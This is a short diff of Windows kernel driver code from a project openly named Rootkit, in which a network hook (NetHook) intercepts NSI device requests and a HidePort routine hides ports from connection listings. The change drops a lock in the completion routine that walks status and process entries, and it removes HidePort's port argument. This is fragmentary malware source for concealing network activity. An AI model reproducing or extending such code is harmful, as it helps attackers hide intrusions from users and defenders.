@@ -21,7 +21,6 @@ NTSTATUS NsiCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP pIrp, PVOID Cont
 		PNSI_STATUS_ENTRY statusEntries = (PNSI_STATUS_ENTRY)nsiParam->StatusEntries;
 		PNSI_PROCESS_ENTRY processEntries = (PNSI_PROCESS_ENTRY)nsiParam->ProcessEntries;
 
-		AutoLock lock(Net.Lock);
 
 		for (DWORD i = 0; i < nsiParam->Count; i++)
 		{
@@ -89,7 +88,7 @@ NTSTATUS Rootkit::NetHook::HookDeviceIo(IN PDEVICE_OBJECT DeviceObject, IN PIRP 
 }
 
 
-NTSTATUS Rootkit::NetHook::HidePort(USHORT Port)
+NTSTATUS Rootkit::NetHook::HidePort()
 {
 	NTSTATUS status = STATUS_SUCCESS;
 
